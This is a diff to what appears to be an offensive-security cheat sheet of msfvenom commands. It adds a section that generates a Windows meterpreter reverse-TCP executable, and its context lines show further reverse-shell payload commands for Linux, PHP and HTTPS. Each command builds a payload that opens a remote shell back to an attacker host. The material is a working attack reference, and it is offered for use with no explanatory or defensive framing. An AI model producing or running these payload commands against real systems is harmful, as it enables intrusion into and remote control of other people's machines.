@@ -1077,6 +1077,11 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o r
 msfvenom -p php/reverse_php LHOST=attacker.ip LPORT=443 -f raw > shell.pHP
 ~~~
 
+## ReverseShell(TCP)
+~~~ bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=attacker.ip LPORT=443 -f exe -o met.exe
+~~~
+
 ## ReverseShell(HTTPS)
 ~~~ bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=attacker.ip LPORT=443 -f exe -o met.exe
